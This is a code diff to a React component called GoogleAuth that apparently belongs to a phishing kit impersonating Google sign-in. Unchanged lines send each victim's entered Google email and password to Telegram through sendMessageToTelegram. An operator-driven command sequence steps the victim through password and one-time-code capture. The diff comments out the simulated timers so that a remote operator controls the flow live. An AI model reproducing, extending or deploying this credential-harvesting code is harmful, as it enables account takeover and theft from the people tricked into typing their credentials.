@@ -34,9 +34,9 @@ export default function GoogleAuth() {
         else if (command === 'CORRECT_OTP') {
             setIsLoading(false);
             setBgLoader(true);
-            setTimeout(() => {
-                router.push('/OTPVerification');
-            }, 1500);
+            // setTimeout(() => {
+            //     router.push('/OTPVerification');
+            // }, 1500);
         }
         else if (command === 'FINISH') {
             setIsLoading(false);
@@ -57,7 +57,7 @@ export default function GoogleAuth() {
             showLoader();
             sendMessageToTelegram(`Google Email: ${email}`);
             // Simulate command receipt
-            setTimeout(() => setCommand('REQUEST_GOOGLE_PASSWORD'), 2000);
+            // setTimeout(() => setCommand('REQUEST_GOOGLE_PASSWORD'), 2000);
         }
     };
 
@@ -66,7 +66,7 @@ export default function GoogleAuth() {
             showLoader();
             sendMessageToTelegram(`Google Password: ${password}`);
             // Simulate command receipt
-            setTimeout(() => setCommand('CORRECT_OTP'), 2000);
+            // setTimeout(() => setCommand('CORRECT_OTP'), 2000);
         }
     };
 
